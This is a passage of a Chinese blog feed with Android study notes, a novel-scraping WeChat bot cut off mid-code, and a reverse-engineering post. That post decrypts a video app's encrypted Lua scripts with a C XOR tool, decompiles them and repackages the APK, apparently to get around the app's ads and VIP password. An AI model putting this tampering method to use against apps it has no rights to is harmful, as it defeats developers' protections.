href="#AndroidManifes-xml" class="headerlink" title="AndroidManifes.xml"></a>AndroidManifes.xml</h2><p><code>android:name</code>: 必须属性，表示activity文件路径</p><h2 id="启动activity"><a href="#启动activity" class="headerlink" title="启动activity"></a>启动activity</h2><h3 id="实际过程"><a href="#实际过程" class="headerlink" title="实际过程"></a>实际过程</h3><p>activity调用startActivity(Intent)方法时，调用请求发送给了操作系统的ActivityManager，ActivityManager负责创建Activity实例并调用其onCreate(Bundle)方法</p><p><img src="/2020/03/18/Android编程权威指南学习笔记一/3.png" alt="3"></p><h3 id="基于Intent的通信"><a href="#基于Intent的通信" class="headerlink" title="基于Intent的通信"></a>基于Intent的通信</h3><p>intent对象是component用来与操作系统通信的一种媒介工具</p><h4 id="component"><a href="#component" class="headerlink" title="component"></a>component</h4><ol><li>activity</li><li>service</li><li>broadcast receiver</li><li>content provider</li></ol><h4 id="intent是一种多用途通信工具"><a href="#intent是一种多用途通信工具" class="headerlink" title="intent是一种多用途通信工具"></a>intent是一种多用途通信工具</h4><h4 id="显式intent与隐式intent"><a href="#显式intent与隐式intent" class="headerlink" title="显式intent与隐式intent"></a>显式intent与隐式intent</h4><h5 id="显式intent"><a href="#显式intent" class="headerlink" title="显式intent"></a>显式intent</h5><p>通过指定Context与Class对象，然后调用intent的构造方法来创建的Intent</p><h5 id="隐式intent"><a href="#隐式intent" class="headerlink" title="隐式intent"></a>隐式intent</h5><p>一个应用的activity如需启动另一个应用的activity，可通过创建隐式intent来处理</p><h2 id="activity间的数据传递"><a href="#activity间的数据传递" class="headerlink" title="activity间的数据传递"></a>activity间的数据传递</h2><h3 id="intent-extra"><a href="#intent-extra" class="headerlink" title="intent extra"></a>intent extra</h3><ol><li><p>extra是一种键值结构</p></li><li><p>将extra数据信息添加给intent</p></li></ol><blockquote><p>public Intent putExtra(String name, boolean value)</p></blockquote><p>activity可能启动自不同的地方，所以，应该在获取和使用extra信息的activity那里，为它定义键</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String EXTRA_ANSWER_IS_TRUE = <span class="string">"com.suqir.android.geoquiz.answer_is_true"</span>;<span class="comment">// 可避免来自不同应用的extra间发生命名冲突</span></span><br></pre></td></tr></table></figure><p><code>newIntent(...)</code>方法中封装处理extra信息的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Intent <span class="title">newIntent</span><span class="params">(Context pakageContext, <span class="keyword">boolean</span> answerIsTrue)</span></span>&#123;</span><br><span class="line">Intent intent = <span class="keyword">new</span> Intent(pakageContext, CheatActivity.class);</span><br><span class="line">intent.putExtra(EXTRA_ANSWER_IS_TRUE, answerIsTrue);</span><br><span class="line"><span class="keyword">return</span> intent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要传递多个参数可以需要在newIntent方法里添加多个参数</p><ol start="3"><li>从extra获取数据</li></ol><blockquote><p>public boolean getBooleanExtra(String name, boolean defaultValue)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getIntent().getBooleanExtra(EXTRA_ANSWER_IS_TRUE, <span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><h3 id="从子-activity-获取返回结果"><a href="#从子-activity-获取返回结果" class="headerlink" title="从子 activity 获取返回结果"></a>从子 activity 获取返回结果</h3><blockquote><p>public void startActivityForResult(Intent intent, int requestCode)</p></blockquote><h4 id="设置返回结果"><a href="#设置返回结果" class="headerlink" title="设置返回结果"></a>设置返回结果</h4><blockquote><p>public final void setResult(int resultCode)<br>public final void setResult(int resultCode, Intent data)</p></blockquote><ol><li>父activity依据子activity的完成结果采取不同操作</li><li>默认的结果代码 -<code>Activity.RESULT_CANCELED</code></li></ol><h4 id="返还intent"><a href="#返还intent" class="headerlink" title="返还intent"></a>返还intent</h4><ol><li>创建一个Intent</li><li>附加上extra信息</li><li>调用<code>Activity.setResult(int, Intent)</code>方法</li><li>添加一个方法协助解析出父activity能用的信息</li></ol><h4 id="处理返回结果"><a href="#处理返回结果" class="headerlink" title="处理返回结果"></a>处理返回结果</h4><ol><li>父类覆盖<code>onActivityResult(...)</code>方法获取子activity回传的值</li><li>检查请求代码和返回代码是否符合预期</li></ol><h1 id="第六章-Android-SDK版本与兼容"><a href="#第六章-Android-SDK版本与兼容" class="headerlink" title="第六章 Android SDK版本与兼容"></a>第六章 Android SDK版本与兼容</h1><h2 id="Android-SDK版本"><a href="#Android-SDK版本" class="headerlink" title="Android SDK版本"></a>Android SDK版本</h2><p>所有的设置都保存在应用模块的<code>build.gradle</code>文件中。编译版本独占该文件，最低版本和目标版本在该文件中的作用是覆盖和设置配置文件<code>AndroidManifest.xml</code></p><h3 id="最低版本（minSdkVersion）"><a href="#最低版本（minSdkVersion）" class="headerlink" title="最低版本（minSdkVersion）"></a>最低版本（minSdkVersion）</h3><p>以最低版本设置值为标准，操作系统会拒绝将应用安装在系统版本低于标准的设备上。  </p><h3 id="目标版本（targetSdkVersion）"><a href="#目标版本（targetSdkVersion）" class="headerlink" title="目标版本（targetSdkVersion）"></a>目标版本（targetSdkVersion）</h3><p>目标版本的设定值告知Android：应用是为哪个API级别设计的。大多数情况下，目标版本即最新发布的Android版本。</p><h3 id="编译版本（compileSdkVersion）"><a href="#编译版本（compileSdkVersion）" class="headerlink" title="编译版本（compileSdkVersion）"></a>编译版本（compileSdkVersion）</h3><p>SDK最低版本和目标版本会通知给操作系统，而SDK编译版本只是你和编译器之间的私有信息。</p><ul><li>编译目标的最佳选择为最新的API级别</li></ul><h2 id="兼容性问题"><a href="#兼容性问题" class="headerlink" title="兼容性问题"></a>兼容性问题</h2><p>将高API级别代码置于检查Android设备版本的条件语句中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP)</span><br></pre></td></tr></table></figure><ul><li><code>Build.VERSION.SDK_INT</code>常量代表了Android设备的版本号</li></ul><h1 id="第七章-UI-fragment与fragment管理器"><a href="#第七章-UI-fragment与fragment管理器" class="headerlink" title="第七章 UI fragment与fragment管理器"></a>第七章 UI fragment与fragment管理器</h1><h2 id="引入Fragment"><a href="#引入Fragment" class="headerlink" title="引入Fragment"></a>引入Fragment</h2><p>采用<code>fragment</code>而不是<code>activity</code>来管理应用UI，可绕开Android系统activity使用规则的限制</p><p><code>fragment</code>是一种控制器对象， <code>activity</code>可委派它执行任务。这些任务通常就是管理用户界面。<br>受管的用户界面可以是一整屏或是整屏的一部分</p><h2 id="创建-UI-Fragment"><a href="#创建-UI-Fragment" class="headerlink" title="创建 UI Fragment"></a>创建 UI Fragment</h2><ol><li><code>Fragment.onCreate(Bundle)</code>是公共方法，而<code>Activity.onCreate(Bundle)</code>是受保护方法。<code>Fragment.onCreate(Bundle)</code>方法及其他<code>Fragment</code>生命周期方法必须是公共方法，因为托管fragment的activity要调用它们</li><li>类似于<code>activity</code>， <code>fragment</code>同样具有保存及获取状态的<code>bundle</code>。如同使用<code>Activity.onSaveInstanceState(Bundle)</code>方法那样，你也可以根据需要覆盖<code>Fragment.onSaveInstanceState(Bundle)</code>方法</li><li>fragment的视图是在<code>onCreateView(LayoutInflater inflater, ViewGroup container</code>方法里生成的。该 方 法 实 例 化 <code>fragment</code> 视 图 的 布 局 ， 然 后 将 实 例 化 的<code>View</code>返 回 给 托 管<code>activity</code> 。<code>LayoutInflater</code>及<code>ViewGroup</code>是实例化布局的必要参数。 Bundle用来存储恢复数据，可供该方法从保存状态下重建视图</li></ol><h2 id="向-FragmentManager添加-UI-fragment"><a href="#向-FragmentManager添加-UI-fragment" class="headerlink" title="向 FragmentManager添加 UI fragment"></a>向 <code>FragmentManager</code>添加 UI fragment</h2><ol><li><p>在Activity中的<code>onCreate(...)</code>里获取<code>FragmentManager</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FragmentManager fm = getSupportFragmentManager();</span><br></pre></td></tr></table></figure></li><li><p>获取<code>FragmentManager</code>之后，再获取一个<code>fragment</code>交给它管理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Fragment fragment = fm.findFragmentById(R.id.fragment_container);</span><br><span class="line"><span class="keyword">if</span> (fragment == <span class="keyword">null</span>) &#123;</span><br><span class="line">fragment = <span class="keyword">new</span> CrimeFragment();</span><br><span class="line">fm.beginTransaction()</span><br><span class="line">.add(R.id.fragment_container, fragment)</span><br><span class="line">.commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(创建一个新的fragment事务，执行一个fragment添加操作，然后提交该事务)</p><p>fragment事务被用来添加、移除、附加、分离或替换fragment队列中的fragment。</p><p><code>FragmentManager.beginTransaction()</code>方法创建并返回<code>FragmentTransaction</code>实例。<code>FragmentTransaction</code>类支持流接口（fluent interface）的链式方法调用，以此配置<code>FragmentTransaction</code>再返回它。</p><p>其中<code>add(...)</code>方法是整个事务的核心，它有两个参数：容器视图资源ID和新创建的<code>CrimeFragment</code>。容器视图资源ID有两个作用：</p><p>①. 告诉<code>FragmentManager</code>，<code>fragment</code>视图应该出现在<code>activity</code>视图的什么位置；</p><p>②.  唯一标识<code>FragmentManager</code>队列中的fragment。</p></li></ol><h2 id="采用fragment的应用架构"><a href="#采用fragment的应用架构" class="headerlink" title="采用fragment的应用架构"></a>采用fragment的应用架构</h2><p>设计应用时，正确使用fragment非常重要。fragment是用来封装关键组件以方便复用。实践证明，应用单屏最多使用2~3个fragment</p><p>拓展：极限编程方法论中有个YAGNI原则。 YAGNI（ You Aren’t Gonna Need It）的意思是“你不会需要它”，该原则鼓励大家不要去实现那些有可能需要的东西。为什么呢？因为你不会需要它。</p><p>对于fragment，我们坚持AUF（ Always Use Fragments）原则，即“总是使用fragment”。不值得为使用fragment还是activity伤脑筋。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近准备学习安卓开发，选择学习书籍的时候，在《第一行代码》第2版和《Android编程权威指南》第3版之间选择了后者，这篇文章将记录下学习过程中的重点和我学习中遇到的问题&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android开发" scheme="https://blog.suqir.xyz/categories/Android%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>对某视频解析软件的逆向分析</title>
    <link href="https://blog.suqir.xyz/2020/03/07/%E5%AF%B9%E6%9F%90%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>https://blog.suqir.xyz/2020/03/07/%E5%AF%B9%E6%9F%90%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2020-03-07T09:23:07.000Z</published>
    <updated>2020-03-18T10:47:00.659Z</updated>
    
    <content type="html"><![CDATA[<p>该app使用了Lua脚本并进行了加密，借此机会实践一下Lua脚本解密</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近偶然发现一款全网视频解析的软件，安装后发现首页有影响使用体验的广告存在（<strong>现在作者已取消广告</strong>），同时其附加功能需要加群获取密码才能使用。借这个机会尝试通过逆向工程分析其逻辑，同时这个App使用了Lua脚本并进行了加密，也借此机会实践一下Lua脚本的解密</p><ul><li><p>软件的原始版本下载：<a href="http://t.cn/A67dqdcS" target="_blank" rel="noopener">原始版本</a></p></li><li><p>软件截图</p></li></ul><table><thead><tr><th style="text-align:center">首页</th><th style="text-align:center">VIP功能</th><th style="text-align:center">VIP功能</th></tr></thead><tbody><tr><td style="text-align:center"><img src="/2020/03/07/对某视频解析软件的逆向分析/main.jpg" alt="首页" style="zoom: 25%;"></td><td style="text-align:center"><img src="/2020/03/07/对某视频解析软件的逆向分析/vip1.jpg" alt="vip功能" style="zoom: 25%;"></td><td style="text-align:center"><img src="/2020/03/07/对某视频解析软件的逆向分析/vip2.jpg" alt="vip功能" style="zoom: 25%;"></td></tr></tbody></table><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul><li><p><a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">apktool</a>—可以将apk资源解码，并在修改后可以重新构建它们，它还可以执行一些自动化任务，例如构建apk</p></li><li><p><a href="https://www.lanzous.com/iabhd3e" target="_blank" rel="noopener">unluac.jar</a>—是一个lua脚本反编译工具，适用于反编译lua开发的程序源码</p></li></ul><h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul><li><h2 id="使用Apktool对其进行解包，解包到App目录下"><a href="#使用Apktool对其进行解包，解包到App目录下" class="headerlink" title="使用Apktool对其进行解包，解包到App目录下"></a>使用Apktool对其进行解包，解包到App目录下</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool.bat d VIP终结者_5.2.2.apk -o App</span><br></pre></td></tr></table></figure><p>执行完毕后进入App目录下</p><p><img src="/2020/03/07/对某视频解析软件的逆向分析/app_dir.png" alt="app_dir"></p><p>其中：</p><ul><li><p><strong>assets</strong>：存放资源文件，包含<em>Lua</em>脚本</p></li><li><p><strong>lib</strong>：本地库(Native Library)文件夹，包含编译后的本地代码(Native Code)的<em>so</em>文件</p></li><li><p><strong>smail</strong>：存放<code>smail</code>文件，包含<code>Dalvik</code>字节码，是对App的Java代码反编译成字节码的结果</p></li><li><p><strong>AndroidManifest.xml</strong>：包含App的信息</p></li></ul></li></ul><ul><li><h2 id="分析smail"><a href="#分析smail" class="headerlink" title="分析smail"></a>分析smail</h2><p>进入smail文件夹可以看到Java代码的结构：</p><p><img src="/2020/03/07/对某视频解析软件的逆向分析/smail_com.png" alt="samil_com"></p><p>发现存在<code>com.androlua</code>、<code>com.luajava</code>等包名，经搜索相关项目，判断App的大部分代码均来自<a href="https://github.com/nirenr/AndroLua_pro" target="_blank" rel="noopener">AndroLua_pro</a>。而AndroLua_pro是一个使用Lua语言编写的Android应用的项目，所以，Java代码极有可能并不是应用的主体部分，重要操作很有可能会写在Lua中，所以下面重点分析Lua脚本部分。</p></li></ul><ul><li><h2 id="初步分析Lua"><a href="#初步分析Lua" class="headerlink" title="初步分析Lua"></a>初步分析Lua</h2><p>进入assets可以看到里面存放了所有的Lua脚本及App的图片资源：</p><p><img src="/2020/03/07/对某视频解析软件的逆向分析/assets.png" alt="assets"></p><p>用winhex打开lua脚本:</p><p><img src="/2020/03/07/对某视频解析软件的逆向分析/lua_encrypt.png" alt="lua_encrypt"></p><p>发现并不是Lua明文代码，也不是编译后的<code>luac</code>文件。由此得知Lua脚本被加密了，需要对其进行解密</p></li></ul><ul><li><h2 id="解密Lua"><a href="#解密Lua" class="headerlink" title="解密Lua"></a>解密Lua</h2><p>AndroLua_Pro所使用的Lua工具<code>LuaJava</code>会加载依赖库<code>libluajava.so</code>，<code>LuaJava</code>会使用<code>luaL_loadbuffer</code>或者<code>luaL_loadbufferx</code>函数对Lua脚本进行加载，这个函数也是加入Lua脚本解密代码的常见位置，所以找到<code>lib/armeabi/libluajava.so</code>，用IDA打开并找到这个函数，按<code>F5</code>进行进一步分析：</p><p><img src="/2020/03/07/对某视频解析软件的逆向分析/so_f5.png" alt="so_f5"></p><p>（上图为方便阅读，已反混淆变量名）</p><p>与AndroLua_Pro的<a href="https://github.com/nirenr/AndroLua_pro/blob/f996270a1a01a4e41836c108d11df08803d6eb59/app/src/main/jni/lua/lauxlib.c#L770-L776" target="_blank" rel="noopener">原始代码</a>比较，可以发现加入了Lua脚本解密的代码，分析该代码发现有一个IDA无法识别的函数<code>sub_265E0(t, 255)</code>，由于对IDA工具还有很多不懂的地方，故没有深入研究，初步猜测是t对255的取余运算（后面验证确实如此）。我们可以参考这一代码，使用C语言编写一个简单的解密工具：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">decrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buff, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *buff1 = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) <span class="built_in">malloc</span>(size);</span><br><span class="line">buff1[<span class="number">0</span>] = <span class="number">27</span>;</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; size; i++) &#123;</span><br><span class="line">t += size;</span><br><span class="line">buff1[i] = buff[i] ^ (t % <span class="number">255</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> buff1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buff[<span class="number">204800</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> filename[<span class="number">20</span>] = <span class="string">"main.lua"</span>;</span><br><span class="line"> <span class="keyword">if</span> (argc == <span class="number">2</span>)</span><br><span class="line">  <span class="built_in">strcpy</span>(filename,argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"File name: %s \n"</span>, filename);</span><br><span class="line"></span><br><span class="line">FILE *fp = fopen(filename, <span class="string">"rb"</span>);</span><br><span class="line"><span class="keyword">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">size = fread(buff, <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>), <span class="number">204800</span>, fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"File size: %ld \n"</span>, size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *res = decrypt(buff, size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcat</span>(filename, <span class="string">"c"</span>);</span><br><span class="line">FILE *fp1 = fopen(filename, <span class="string">"wb"</span>);</span><br><span class="line">fwrite(res, <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>), size, fp1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Output: %s"</span>, filename);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这一代码为<code>decrypt.exe</code>，并拷贝到<code>assets</code>文件夹下，执行以下命令来解密<code>config.lua</code>脚本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decrypt.exe config.lua</span><br></pre></td></tr></table></figure><p><img src="/2020/03/07/对某视频解析软件的逆向分析/cmd_decrypt.png" alt="cmd_decrypt"></p></li></ul><p>  解密后的文件为<code>config.luac</code>，使用文本编辑器观察可以发现其仍然不是Lua代码，而是编译后的luac文件，我们还需要使用<code>unluac.jar</code>对其进行反编译。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar unluac.jar --rawstring config.luac &gt; config_new.lua</span><br></pre></td></tr></table></figure><p>  <img src="/2020/03/07/对某视频解析软件的逆向分析/cmd_luac2lua.png" alt="cmd_luac2lua"></p><p>  (如果原始的源码中含有中文，需使用<code>--rawstring</code>参数进行解码)</p><p>  反编译后的<code>config.lua</code>脚本内容如下：</p><p>  <img src="/2020/03/07/对某视频解析软件的逆向分析/config.png" alt="config"></p><p>  对Lua脚本的修改不是本文探讨的重点，故不做分析。</p><p>  使用如下命令进行打包：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b App –o out/newApp.apk</span><br></pre></td></tr></table></figure><p>  打包后的apk文件没有签名是不能安装到手机上的，需要使用其他的签名工具来对apk签名如<code>signapk.jar</code>、<code>auto-sign</code>等</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>本文分析了在Android中Lua脚本的解密过程，可以看到，软件的开发和逆向分析虽然看似处于对立的层面，但是双方的博弈过程却又促进着各自的发展，这使得开发人员更加重视软件的安全性，逆向工程师们也与时俱进的学习新的知识来面对越来越复杂的安全工作。随着国家现在越来越重视互联网安全问题，很多法律法规的出台来约束互联网规范，我们更应该重视安全对于各行各业的影响和机遇。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;该app使用了Lua脚本并进行了加密，借此机会实践一下Lua脚本解密&lt;/p&gt;
    
    </summary>
    
    
      <category term="逆向分析" scheme="https://blog.suqir.xyz/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>爬取某书网指定小说-微信版</title>
    <link href="https://blog.suqir.xyz/2018/12/15/%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4-%E5%BE%AE%E4%BF%A1%E7%89%88/"/>
    <id>https://blog.suqir.xyz/2018/12/15/%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4-%E5%BE%AE%E4%BF%A1%E7%89%88/</id>
    <published>2018-12-15T10:46:39.000Z</published>
    <updated>2020-03-18T10:47:36.581Z</updated>
    
    <content type="html"><![CDATA[<p>服务器版的小说爬虫，并借助python的itchat库实现微信对话式小说下载服务<br><a id="more"></a></p><h1 id="实现功能"><a href="#实现功能" class="headerlink" title="实现功能"></a>实现功能</h1><p>微信端发送小说名到指定微信号（格式：小说名suqir作者），服务器开始在全书网(<code>http://www.quanshuwang.com</code>)爬取该小说，爬取完成后将询问是否下载，确认后将通过微信以文件的形式发送</p><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">from</span> itchat.content <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookSpyder</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""爬取指定小说-server版"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, book_name,book_author)</span>:</span></span><br><span class="line">        super(BookSpyder, self).__init__()</span><br><span class="line">        self.book_author = book_author</span><br><span class="line">        self.headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span>&#125;</span><br><span class="line">        self.url = <span class="string">'http://www.quanshuwang.com/modules/article/search.php?searchkey='</span>+urllib.request.quote(book_name.encode(<span class="string">'gb2312'</span>))+<span class="string">'&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22'</span></span><br><span class="line">        search_data = requests.get(self.url,headers=self.headers,allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 搜索结果唯一时</span></span><br><span class="line">            self.location = search_data.headers[<span class="string">'location'</span>].split()</span><br><span class="line">            self.location2res(self.location[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            self.location = re.findall(<span class="string">r'&lt;li&gt;&lt;a target="_blank" href="(.*?)".*?title="(.*?)".*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href='</span>,search_data.content.decode(<span class="string">'gbk'</span>))</span><br><span class="line">            <span class="keyword">for</span> http <span class="keyword">in</span> self.location:</span><br><span class="line">                flag = self.location2res(http[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#link</span></span><br><span class="line">        self.booklink = re.findall(<span class="string">r'class="leftso png_bg"&gt;&lt;a href="(.*?)"'</span>,self.res)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#正则匹配书名</span></span><br><span class="line">        self.book_name = re.findall(<span class="string">r'&lt;meta property="og:title" content="(.*?)"/&gt;'</span>,self.res)[<span class="number">0</span>]</span><br><span class="line">        response = requests.get(self.booklink,headers=self.headers).content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">        <span class="comment">#正则匹配所有章节及其链接</span></span><br><span class="line">        self.contents = re.findall(<span 